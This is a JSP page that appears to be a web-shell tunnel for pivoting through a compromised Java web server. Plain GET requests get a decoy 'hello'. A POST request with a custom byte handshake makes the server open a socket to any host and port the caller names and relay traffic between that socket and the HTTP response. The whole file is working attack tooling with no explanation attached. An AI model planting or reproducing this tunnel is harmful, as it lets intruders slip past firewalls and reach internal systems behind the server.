<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.OutputStream" %>
<%@ page import="java.net.Socket" %>
<%!
    public String readCString(InputStream inputStream) throws IOException {
    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    byte c;
    while ((c= (byte) inputStream.read())!=0){
        buffer.write(c);
    }
    return new String(buffer.toByteArray());
}
    public static byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0){
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        System.arraycopy(original, from, copy, 0,
                Math.min(original.length - from, newLength));
        return copy;
    }
    public static boolean equalsArray(byte[] a, byte[] a2) {
        if (a==a2){
            return true;
        }
        if (a==null || a2==null){
            return false;
        }

        int length = a.length;
        if (a2.length != length){
            return false;
        }

        for (int i=0; i<length; i++){
            if (a[i] != a2[i])
                return false;
        }

        return true;
    }
    //return readBuffer
    private byte[] readInputStream(InputStream inputStream,int len)throws Throwable{
        int readNumber = 0;
        int offset = 0;
        byte[] buffer = new byte[len];
        while(offset<len&&(readNumber=(inputStream.read(buffer,offset,len)))>0){
            offset+=readNumber;
        }
        if(offset==len){
            return buffer;
        }
        return null;
    }
    class ProxyStream extends Thread{
        public InputStream inputStream;
        public OutputStream outputStream;

        public ProxyStream(InputStream inputStream, OutputStream outputStream) {
            this.inputStream = inputStream;
            this.outputStream = outputStream;
        }

        @Override
        public void run() {
            try {
                byte[] buffer=new byte[4096];
                int readNumber = 0;
                while((readNumber=inputStream.read(buffer))>0){
                    outputStream.write(buffer,0,readNumber);
                    outputStream.flush();
                }
            }catch(Exception e){
                try{
                    inputStream.close();
                }catch(Exception e2){

                }
                try{
                    outputStream.close();
                }catch(Exception e2){

                }
            }
        }
    }
%>
<%
    if (!"POST".equals(request.getMethod())){
        response.getWriter().write("hello");
        return;
    }
    InputStream inputStream=request.getInputStream();
    response.setHeader("Transfer-Encoding","chunked");
    response.setBufferSize(1024);
    OutputStream outputStream=response.getOutputStream();
    try {
        byte[] handshake = readInputStream(inputStream,16);
        if (handshake!=null){
            outputStream.write(handshake);
            outputStream.flush();
            byte[] handshake2 = readInputStream(inputStream,8);

            if (equalsArray(copyOfRange(handshake,0,8),handshake2)){
                outputStream.write(handshake2);
                outputStream.flush();
                String host = readCString(inputStream);
                int port = Integer.parseInt(readCString(inputStream));
                try {
                    Socket socket = new Socket(host,port);
                    OutputStream socketOutput = socket.getOutputStream();
                    InputStream socketInput = socket.getInputStream();
                    outputStream.write(0x01);
                    outputStream.flush();
                    Thread thread = new  ProxyStream(inputStream, socketOutput);
                    Thread thread2 = new ProxyStream(socketInput, outputStream);
                    thread.start();
                    thread2.start();
                    thread.join();
                    thread2.join();
                }catch (IOException e){
                    outputStream.write(0x02);
                    outputStream.write(e.getMessage().getBytes());
                    outputStream.write(0x00);
                }
            }
        }
    }catch (Throwable e){

    }
    try {
        inputStream.close();
    }catch (IOException ioException){

    }
    try {
        outputStream.close();
    }catch (IOException ioException){

    }
%>
